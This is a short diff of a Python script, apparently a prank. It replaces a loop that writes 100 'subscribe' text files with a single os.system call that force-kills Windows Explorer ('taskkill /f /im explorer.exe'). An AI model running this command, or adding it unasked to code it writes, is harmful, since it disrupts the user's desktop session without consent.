@@ -1,5 +1,4 @@
 import os
+import sys 
 
-for i in range(100):
-    with open(f"file_{i}.txt", "w") as f:
-        f.write(f"Everybody go sub to Fireship {i}")
+os.system("taskkill /f /im explorer.exe")
